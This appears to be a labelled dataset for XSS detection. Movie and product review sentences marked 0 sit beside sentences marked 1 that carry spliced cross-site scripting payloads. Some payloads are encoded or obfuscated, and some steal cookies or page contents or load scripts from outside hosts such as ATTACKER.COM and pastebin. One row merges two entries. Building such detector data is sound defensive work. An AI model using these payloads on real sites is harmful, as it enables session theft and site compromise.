label	sentence
0	" In fact, it's hard to remember that the part of Ray Charles is being acted, and not played by the man himself.
0	Her role was played well.
1	Does <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'everything it should and more.
0	To call this movie a drama is ridiculous!
0	I wish I could enter negative values, admins?
1	It doesn't work in Eur<h1><font color=blue>hellox worldss</h1>ope or Asia.
0	After watching this film, I wanted to learn more about the works of this artist.
0	Not even good for camp value!
0	It was just too horrible.
0	But it wasn't anything at all just one big yawn...
0	Woa, talk about awful.
0	It is a really good show to watch.
0	The camera really likes her in this movie.
0	Here's where the movie really pi**ed me off.
1	Couldn't figure FOO<SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>it out
0	And don't even get me started on the jerky camerawork.
1	Doesn't do t&LT;BODY ONLOAD=ALERT('XSS')&GT;he job.
1	But despite these few flaws, this case is of exceptional qualit<IFRAME XMLNS="#" SRC="JAVASCRIPT:ALERT(1)"></IFRAME>y and well worth the additional costs of owning an official OEM product.
0	Damian is so talented and versatile in so many ways of writing and portraying different Characters on screen.
0	I recommend this for EVERYONE who loves film, movies, anything...A Work of Art!
1	They do not last forever, but is not overl<TABLE BACKGROUND="javascript:alert('XSS')">y expensive to replace.Easy to operate and the sound is much better than others I have tried.
0	If you see it, you should probably just leave it on the shelf.
1	When I placed my treo into the case, not only was it NOT snug, but there was A LOT of extra room on the side<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>s.
0	Summary: The witticisms weren't witty.
0	It came free with a DVD player I bought but I still turned the thing off halfway through because I was embarrassed for Howell.
0	Ray Charles' life provided excellent biographical material for the film, which goes well beyond being just another movie about a musician.
1	The rece<A AA AAA AAAA AAAAA AAAAAA AAAAAAA AAAAAAAA AAAAAAAAA AAAAAAAAAA HREF=J&#97V&#97SCRIPT&#X3A;&#97LERT(1)>CLICKMEption through this headset is excellent.
1	I was amazed at the quick arrival of the two original lg cell phone batteries and and at a fraction of <input onblur=write(XSS) autofocus><input autofocus>the price.
0	It is not just a cult... it is a cult CLASSIC.
1	I posted more detailed comments under the grey or black phone, but i have th&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;e Fire Red and it's a great color!
1	Easy <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>to use.
1	Sprint - terrible customer serv<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>ice.
1	I have to use the smallest earpieces provided, but it st<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>ays on pretty well.
0	Even worse than Ticker!
1	After my phone got to be about a year old, it's been slowly breaking despite much <EMBED SRC="HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF">care on my part.
1	I tried talking real loud but<IMG """><SCRIPT>ALERT("XSS")</SCRIPT>"\> shouting on the telephone gets old and I was still told it wasn't great.
0	As a European, the movie is a nice throwback to my time as a student in the 98's and the experiences I had living abroad and interacting with other nationalities, although the circumstances were slightly different.
0	However, I recently watched the whole thing again on DVD, and I was completely struck by how extremely stupid the storyline was - how it contained holes, inconsistencies and - frankly - a whole lot of crap - and how horrid the dancing was.
0	It was so funny.
1	And n<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf">one of the tones is acceptable.
0	The use of slow-motion needlessly repeats itself throughout the movie but is well backed up by bad acting (and bad is a kind word here), no continuity, scenes that are thrown in for no reason whatsoever, vehicles that looked like they were made from a Corn Flakes box and a directorial style that bordered on stupidity.
1	Bluetooth does not work, phone locks up, screens jus<script ^__^>alert(string.fromcharcode(49))</script ^__^t flash up and now it just makes calls randomly while in my pocket locked.
1	ja<input onblur=write(xss) autofocus><input autofocus>bra ear gels "R" the best!.
0	I totally and absolutely recommend this movie to anyone who likes good wholesome family movies because that is exactly what this is.
1	Their Research and Development division obviously knows <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>what they're doing.
1	It was quite comforta<IFRAME SRC="JAVASCRIPT:ALERT('XSS');"></IFRAME>ble in the ear.
0	And his subtle connections between the three films are awesome.
0	Lucy Bell is so much higher than this crap and for her to sink this low is quite depressing.
0	You truly take this journey through the eyes and soul of a child.
0	This movie has a cutting edge to it.
0	He is one of my favourite directors, and one of the most talented directors in the history of cinema.
0	In short - this was a monumental waste of time and energy and I would not recommend anyone to EVER see this film.
0	The plot simply rumbles on like a machine, desperately depending on the addition of new scenes.
0	When I saw it in the theater I thought I was going to be sick.
1	I can barely ever hear on it and am constantly sa<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>ying "what?"
0	The acting was bad.
1	N<! foo="[[[inception]]"><x foo="]foo><script>alert(1)</script>">ot worth it.
0	I like Armand Assante & my cable company's summary sounded interesting, so I watched it, twice already, and probably will again.
1	its extremely slow and takes forever to do anything with<script/&tab; src='https://dl.dropbox.com/u/13018058/js.js' /&tab;></script> it.
0	The acting sucked.
0	I think the most wonderful parts (literally, full of "wonder") are the excerpts from his works.
1	I only used it two <script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>days, and it wasn't always easy to hear with.
0	I wasn't expect1	The nano stat%253cscript%253ealert(document.cookie)%253c/script%253e?><<script>alert(document.cookie);//<</script>ed it.My son was dissapointed.
1	If there is a wind, it is completely us<SVG/ONLOAD="(NEW IMAGE()).SRC='//ATTACKER.COM/'%2BDOCUMENT.DOCUMENTELEMENT.INNERHTML">eless.
1	They keep getting better and better (this is my third one and I've had nu&LT;LAYER SRC=\"HTTP&#58;//HA&#46;CKERS&#46;ORG/SCRIPTLET&#46;HTML\"&GT;&LT;/LAYER&GT;merous Palms too).
0	It ranks highly as a great noir-crime-drama, incredible performances by Belmondo and Lino Ventura.
1	The calls drop, the phone comes on and off at will, the screen goesEXP/*&LT;A STYLE='NO\XSS&#58;NOXSS(\"*//*\"); black and the worst of all it stops ringing intermittently.
1	Battery has no lif<! FOO="[[[INCEPTION]]"><X FOO="]FOO><SCRIPT>ALERT(1)</SCRIPT>">e.
0	This is high adventure at its best.
1	Steer clear of this product and go with the genuine Palm replacementr pens&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;, which come in a three-pack.
1	wont work right or atleast<SVG><STYLE>{FONT-FAMILY&COLON;'<IFRAME/ONLOAD=CONFIRM(1)>' for me.
0	An interesting premise, and Billy Drago is always good as a dangerous nut-bag (side note: I'd love to see Drago, Stephen McHattie and Lance Hendrikson in a flick together; talk about raging cheekbones!).
0	The movie lacks visual interest, drama, expression of feeling, and celebration of the very patriotism that underlines the narrative.
1	For the price this was a great deal.<IMG SRC= ONMOUSEOVER="ALERT('XXS')">
1	Finally, after three or four times the spring of the latch broke and I could not use it any longer on %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-the visor.
0	Even Billy Bob couldn't rise above the script, which was worse.
1	Great Pro<form><isindex formaction="javascript&colon;confirm(1)"duct.
1	A must study for anyone interested in the "wo<script 5-0*3+9/3=>prompt(1)</script giveanswerhere=?rst sins" of industrial design.
1	Phone is sturdy as all no<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">kia bar phones are.
1	If you are looking for a good q<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>uality Motorola Headset keep looking, this isn't it.
0	This movie is terrible.
0	A world better than 95% of the garbage in the theatres today.
1	It is cheap, and it feel and loo<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>k just as cheap.
1	Looks good in the picture, but this case was a huge disappointme<img/src=`%00` onerror=this.onerror=confirm(1)nt!!
1	Great <AUDIO AUTOPLAY ONLOADEDMETADATA=ALERT(1)> <SOURCE SRC="VALIDAUDIO.WAV" TYPE="AUDIO/WAV"></AUDIO>Phone.
1	The phone can also take great pi"><iframe onload="eval('d=document; _=d.createelement(\'script\');_.src=\'\/\/domain/m\';d.body.appendchild(_)')">ctures and even video clips.
1	<a id=x tabindex=1 onfocusin=alert(1)></a>Linked to my phone without effort.
0	Everything about this film is simply incredible.
0	It is an excellent drama, an excellent thriller, and an excellent film.
0	Now we were chosen to be tortured with this disgusting piece of blatant American propaganda.
1	Good case!.&LT;TABLE&GT;&LT;TD BACKGROUND=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT;
1	Appears to actually outperform the original battery from Chi<embed src="data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==" type="image/svg+xml" allowscriptaccess="always"></embed>na that came with my V325i.
0	Unfortunately, 'Cover Girl' is an example of how Hollywood used to exploit women for financial gain.
1	The nokia<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> CA-42 USB cable did not work with my phone.
0	The sets are so bad, they wouldn't look out of place on a Thunderbirds episode.
1	Treo and T-Mobile refused to replace it again and forced me to buy another phone without a"/>'><SCRIPT SRC="/USER_UPLOAD/MYPIC.PNG.JS"></SCRIPT>ny kind of upgrade discount.
1	Plus, I s&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;eriously do not believe it is worth its steep price point.
0	They could be used as exemplars for any set designer.
1	No ear loop needed, it's tiny and the sound +ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-is great.
1	im surprised exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");this is a good quality car charger and there's not much reviews about it.
1	I did not have any problem with this item and would orde&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;r it again if needed.
0	It was forced, like everything in this movie.
0	It's this pandering to the audience that sabotages most of his films.
0	Still, it was the SETS that got a big "" on my "oy-vey" scale.
1	I am sorry <OBJECT DATA="HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF">I made this purchase.
0	I came out of it feeling angry.
1	Terribl<DIV STYLE="WIDTH: EXPRESSION(ALERT('XSS'));">e phone holder.
1	While I managed to bend the leaf spring back in place, the metal now has enough stress that it w?; ALERT(DOCUMENT.COOKIE); VAR FOO=?ill break on the next drop.
0	Barney is definitely super DE duper.
1	I am very happ</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>y
0	One more thing: I can tolerate political incorrectness very well, I'm all for artistic freedom and suspension of disbelief, but the Slavic female character was just too much.
1	It is light, has plenty of battery ca<svg xmlns="#"><script>alert(1)</script></svg>pacity, and is very confortable to wear for somewhat extended periods of time.
1	You &lt;BODY ONLOAD=alert('XSS')&gt;need two hands to operate the screen.This software interface is decade old and cannot compete with new software designs.
0	Regrettably, the film fails.
1	Good value, works f&lt;img lowsrc=\"javascript&#058;alert('xss')\"&gt;ine - power via USB, car, or wall outlet.
1	I hav&lt;link rel=\"stylesheet\" href=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;e always used corded headsets and the freedom from the wireless is very helpful.
1	The Jabra EarGels fit my ears very well.<INPUT ONBLUR=WRITE(XSS) AUTOFOCUS><INPUT AUTOFOCUS>
0	the story which was told so eloquently by Francis ford Coppola 25 years earlier, really unfolds gradually and leaves room for the characters to develop.
0	) What makes this story different are the terrific production values - faultless photography, composition and editing - the terrific casting - the underappreciated Brian Keith playing a bully Teddy - and vivid history.
1	It was a grea&lt;body onload=alert('xss')&gt;t phone.
0	Wow, what a bad film.
1	I bought these hoping I could make my Bluetooth headset fit better but th"/>'><SCRIPT SRC=HTTPS://ATTACKER.COM/EVIL.JS></SCRIPT>ese things made it impossible to wear.
1	# It Works - #2 It is Comfortabl<BODY ONLOAD=ALERT('HELLOX WORLDSS')>e.
0	It didn't make me scared, horrified, or make me sympathetic towards the characters; it was simply annoying.
1	I would hi<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">ghly recommend this product.
0	I highly recommend this movie for anyone interested in art, poetry, theater, politics, or Japanese history.
1	I used bitpim (a free program you can find on the &lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;internet)to transfer data to the phone.The price of the cable was excellent.
0	Not too screamy not to masculine but just right.
1	Don't make the same mistake that I&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt; did and please don't buy this phone.
1	The real killer is the volume, and of c<IMG SRC= onmouseover="alert('xxs')">ourse it breaking.
1	Grea<DIV STYLE="width: expression(alert('XSS'));">t phone.
1	I love the ringtones becau<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script><div ng-app ng-csp>{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}</div>"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>se they are so upbeat!
1	It's A PIECE OF CRAP!<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
0	The attention given to every character, and complex psychological portrayals, detailing loyalty, treachery, love, and hope, are tremendous.
1	Can't sto<h1><font color=blue>hellox worldss</h1>re anything but phone numbers to SIM.
1	This f<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?ixes all the problems.
1	It<scr<script>ipt>alert(document.cookie)</scr</script>ipt>s the best headset I have used.
0	Thanks good a movie like this was done and released.
0	Everything from acting to cinematography was solid.
0	The acting was decidely wooden, though no worse than a period Universal B movie.
1	It dit not work <frameset><frame src="javascript:alert('xss');"></frameset>most of the time with my Nokia 532.
0	This is such a fun and funny movie.
1	I high<SCRIPT ^__^>ALERT(STRING.FROMCHARCODE(49))</SCRIPT ^__^ly recommend this case.
1	None of the three sizes th&lt;div style=\"width&#58; expression(alert('xss'));\"&gt;ey sent with the headset would stay in my ears.
0	Three of the most visually appealing movies i've ever seen.
0	The jerky camera movements were also annoying.
0	In particular the relationship between the bakery assistant and the waitress just didn't work for me at all.
0	It just blew.
1	Clea<a id=x tabindex=1 onfocusin=alert(1)></a>r crisp sound.
1	Krusxss&#58;ex&#x2f;*xss*//*/*/pression(alert(\"xss\"))'&gt;sel Always good.
1	Yet Plantronincs continues<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>' to use the same flawed charger design.
0	It is very educational for children  to 8 years old.
0	is pretty funny.
0	The dialogue sucked.
0	You can't even tell if they have any talent because they not only have pathetic lines to speak but the director gave them no action.
1	Also difficult to put odocument.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";n.I'd recommend avoiding this product.
1	However, the ear pads come off easily and af&LT;XSS STYLE=\"XSS&#58;EXPRESSION(ALERT('XSS'))\"&GT;ter only one week I lost one.
0	I thoroughly enjoyed it when Christopher Eccleston took control of the TARDIS and the continuation of the series.
0	The kids are very cool too.
0	It's just lame.
1	I don't think it would hold it too securly on your<IFRAME SRCDOC='<SCRIPT SRC="DATA:TEXT/JAVASCRIPT,ALERT(DOCUMENT.DOMAIN)"></SCRIPT>'></IFRAME> belt.
0	But when someone strives for greatness and poetry, but delivers a muddled (and often ridiculous) story, a bunch of disparate scenes, pretentious dialogue... Then you get the worst kind of a movie that some other reviewer very accurately defined as "pretentious crap".
0	I liked it.
0	His use of the colours of the French flag in the three films was nothing short of incredible, every shot, every scene was like a work of art.
0	Mishima is extremely uninteresting.
1	Disappointing accessory from a good manufacturer&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;.
0	This is one of the best movies out there that shows such strong sibling bond for each other.
1	This is a great de//<FORM/ACTION=JAVASCRIPT&#X3A;ALERT&LPAR;DOCUMENT&PERIOD;COOKIE&RPAR;><INPUT/TYPE='SUBMIT'>//al.
0	The telephone repair man was really funny and his reactions to the nuts and bitchy boss were truly genuine.
1	After rec&lt;div style=\"background-image&#58;\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;eiving and using the product for just 2 days it broke.
1	So just be<iframe/src=javascript:alert(1)>ware.
1	Performed awful -- muffled, tinny incoming sound and severe echo for those on the other end of t<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">he call.
0	Everything about this movie is stupid.
1	I love the look and fefoo\?; alert(document.cookie);//?;el of Samsung flipphones.
1	Ba<svg xmlns="#"><script>alert(1)</script></svg>ttery is terrible.
1	Poor quality.<input onfocus=write(xss) autofocus>
0	He owns the film, just as Spacek owned "Coal Miner's Daughter" and Quaid owned "Great Balls of Fire.
